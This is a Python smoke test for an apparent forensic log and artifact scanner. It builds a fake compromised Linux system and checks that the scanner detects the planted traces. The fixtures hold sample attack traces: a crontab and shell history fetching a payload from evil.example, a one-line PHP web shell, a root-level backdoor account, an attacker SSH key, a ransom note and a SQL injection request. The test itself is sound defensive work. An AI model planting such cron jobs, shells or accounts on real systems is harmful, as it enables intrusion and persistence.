from __future__ import annotations

import gzip
import importlib.util
import json
import tempfile
import unittest
from pathlib import Path

import zstandard

from researcher.cli import main


class SmokeTest(unittest.TestCase):
    def test_scans_logs_and_system_artifacts(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            base = Path(temp_dir)
            root = base / "root"
            out = base / "out"
            logs = root / "var" / "log" / "nginx"
            logs.mkdir(parents=True)
            (logs / "access.log").write_text('198.51.100.24 - - [17/May/2026:10:00:00 +0000] "GET /.env HTTP/1.1" 404 12 "-" "curl"\n203.0.113.8 - - [17/May/2026:10:01:00 +0000] "GET /index.html HTTP/1.1" 200 42 "-" "Mozilla"\n198.51.100.24 - - [17/May/2026:10:01:30 +0000] "GET /search?q=1%27+union+select+null HTTP/1.1" 500 9 "-" "sqlmap"\n', encoding="utf-8")
            with gzip.open(logs / "access.log.1.gz", "wt", encoding="utf-8") as handle:
                handle.write('198.51.100.24 - - [17/May/2026:10:02:00 +0000] "POST /wp-login.php HTTP/1.1" 403 9 "-" "bot"\n')
            compressed = zstandard.ZstdCompressor().compress(
                b'198.51.100.24 - - [17/May/2026:10:02:30 +0000] "GET /.git/config HTTP/1.1" 404 9 "-" "zstd-bot"\n'
            )
            (logs / "access.log.2.zst").write_bytes(compressed)
            auth_log = root / "var" / "log" / "auth.log"
            auth_log.write_text("May 17 10:03:00 host sshd[1]: Failed password for root from 198.51.100.24 port 22 ssh2\nMay 17 10:04:00 host sshd[1]: Accepted password for root from 198.51.100.24 port 22 ssh2\n", encoding="utf-8")
            etc = root / "etc"
            etc.mkdir()
            (etc / "passwd").write_text("root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/root:/bin/bash\n", encoding="utf-8")
            (etc / "crontab").write_text("* * * * * root wget http://evil.example/payload.sh\n", encoding="utf-8")
            root_home = root / "root"
            (root_home / ".ssh").mkdir(parents=True)
            (root_home / ".ssh" / "authorized_keys").write_text("ssh-rsa AAAATEST attacker\n", encoding="utf-8")
            (root_home / ".bash_history").write_text("wget http://evil.example/a\nnmap -sS 10.0.0.0/8\n", encoding="utf-8")
            (root / "tmp").mkdir(parents=True, exist_ok=True)
            (root / "tmp" / "README_DECRYPT.txt").write_text("Send bitcoin to bc1qexamplewalletaddress000000000000000000\n", encoding="utf-8")
            web_root = root / "var" / "www" / "html"
            web_root.mkdir(parents=True)
            (web_root / "shell.php").write_text("<?php system('id'); ?>\n", encoding="utf-8")
            (web_root / ".env").write_text("DB_PASSWORD=secret\n", encoding="utf-8")
            exit_code = main(["--root", str(root), "--out", str(out)])
            self.assertEqual(exit_code, 0)
            summary = json.loads((out / "summary.json").read_text(encoding="utf-8"))
            self.assertEqual(summary["os_type"], "linux")
            attackers = (out / "attackers.txt").read_text(encoding="utf-8")
            events = (out / "events.csv").read_text(encoding="utf-8")
            scanned_files = (out / "scanned_files.txt").read_text(encoding="utf-8")
            compromise = (out / "indicators" / "successful_logins_after_bruteforce.txt").read_text(encoding="utf-8")
            self.assertIn("198.51.100.24", attackers)
            self.assertIn("suspicious_web_requests: 4", attackers)
            self.assertIn("failed_logins: 1", attackers)
            self.assertIn("successful_logins: 1", attackers)
            self.assertIn("access.log.1.gz", events)
            self.assertIn("access.log.2.zst", events)
            self.assertIn("category", events)
            self.assertIn("referrer", events)
            self.assertIn("nginx/access.log - events: 3", scanned_files)
            self.assertIn("198.51.100.24", compromise)
            self.assertTrue((out / "summary.txt").exists())
            self.assertTrue((out / "report.md").exists())
            self.assertIn("Linux", (out / "report.md").read_text(encoding="utf-8"))
            self.assertTrue((out / "timeline.csv").exists())
            self.assertTrue((out / "timeline.txt").exists())
            self.assertTrue((out / "iocs" / "ips.txt").exists())
            self.assertTrue((out / "iocs" / "urls.txt").exists())
            self.assertTrue((out / "accounts" / "accounts.csv").exists())
            self.assertTrue((out / "persistence" / "persistence.csv").exists())
            self.assertTrue((out / "commands" / "commands.csv").exists())
            self.assertTrue((out / "commands" / "downloaded_payloads.txt").exists())
            self.assertTrue((out / "web_compromise" / "web_compromise.csv").exists())
            self.assertTrue((out / "secrets" / "secrets.csv").exists())
            self.assertTrue((out / "indicators" / "risk_scores.csv").exists())
            self.assertTrue((out / "yara" / "yara.csv").exists())
            self.assertTrue((out / "threats" / "summary.txt").exists())
            self.assertTrue((out / "threats" / "injections.csv").exists())
            self.assertTrue((out / "threats" / "outbound_attacks.txt").exists())
            self.assertTrue((out / "threats" / "outbound_ips.csv").exists())
            self.assertTrue((out / "threats" / "outbound_ips.txt").exists())
            outbound_ips = (out / "threats" / "outbound_ips.csv").read_text(encoding="utf-8")
            self.assertIn("10.0.0.0", outbound_ips)
            self.assertIn("target", outbound_ips)
            self.assertIn("10.0.0.0", (out / "iocs" / "outbound_targets.txt").read_text(encoding="utf-8"))
            self.assertIn("outbound_target_ips", summary["threats"])
            self.assertTrue((out / "threats" / "extortion.txt").exists())
            threats = (out / "threats" / "threats.csv").read_text(encoding="utf-8")
            self.assertIn("sql_injection", (out / "threats" / "injections.csv").read_text(encoding="utf-8"))
            self.assertIn("nmap", (out / "threats" / "outbound_attacks.txt").read_text(encoding="utf-8"))
            self.assertIn("ransom_note_file", threats)
            self.assertIn("scan_tool_usage", threats)
            self.assertIn("threats", summary)
            self.assertGreater(summary["threats"]["injection_web_attempts"], 0)
            yara_report = (out / "yara" / "yara.csv").read_text(encoding="utf-8")
            if importlib.util.find_spec("yara") is None:
                self.assertIn("yara_unavailable", yara_report)
            else:
                self.assertIn("Researcher_PHP_Webshell_Common", yara_report)


if __name__ == "__main__":
    unittest.main()
